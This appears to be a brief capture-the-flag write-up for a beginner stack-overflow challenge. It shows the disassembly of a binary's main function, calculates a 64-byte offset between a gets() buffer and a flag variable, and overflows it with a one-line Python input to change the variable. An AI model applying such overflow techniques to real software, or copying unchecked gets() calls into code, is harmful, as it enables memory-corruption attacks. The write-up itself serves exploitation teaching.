First we make binary executable by command
$ chmod +x pwn1-stackoverwrite

Now we see the assembler dump we get 
080483f4 <main>:
 80483f4:	55                   	push   %ebp
 80483f5:	89 e5                	mov    %esp,%ebp
 80483f7:	83 e4 f0             	and    $0xfffffff0,%esp
 80483fa:	83 ec 60             	sub    $0x60,%esp
 80483fd:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%esp)
 8048404:	00 
 8048405:	8d 44 24 1c          	lea    0x1c(%esp),%eax
 8048409:	89 04 24             	mov    %eax,(%esp)
 804840c:	e8 fb fe ff ff       	call   804830c <gets@plt>
 8048411:	8b 44 24 5c          	mov    0x5c(%esp),%eax
 8048415:	85 c0                	test   %eax,%eax
 8048417:	74 0e                	je     8048427 <main+0x33>
 8048419:	c7 04 24 00 85 04 08 	movl   $0x8048500,(%esp)
 8048420:	e8 07 ff ff ff       	call   804832c <puts@plt>
 8048425:	eb 0c                	jmp    8048433 <main+0x3f>
 8048427:	c7 04 24 29 85 04 08 	movl   $0x8048529,(%esp)
 804842e:	e8 f9 fe ff ff       	call   804832c <puts@plt>
 8048433:	c9                   	leave  
 8048434:	c3                   	ret    
 8048435:	90                   	nop
 8048436:	90                   	nop
 8048437:	90                   	nop
 8048438:	90                   	nop
 8048439:	90                   	nop
 804843a:	90                   	nop
 804843b:	90                   	nop
 804843c:	90                   	nop
 804843d:	90                   	nop
 804843e:	90                   	nop
 804843f:	90                   	nop

In line 10 we have moved value 0 to 0x5c($esp) and line 16 we are testing whether $eax(which is 0x5c(4esp)) is 0 or not so we have to make 
0x5c($esp) a non-zero so we calulate offset from where we givw input and we can use gets vulnerability which has no check on input size
Now from line 12 and 13 we know our input is going at position ox1c($esp) so
offset=0x5c-0x1c=64
so to overflow the buffer and make 0x5c($esp) non-zero we have to give input of size greater than 64 
so we use python for this-

$ python -c 'print("a"*65)' |./pwn1-stackoverwrite
and we get output "you have changed the 'modified' variable."









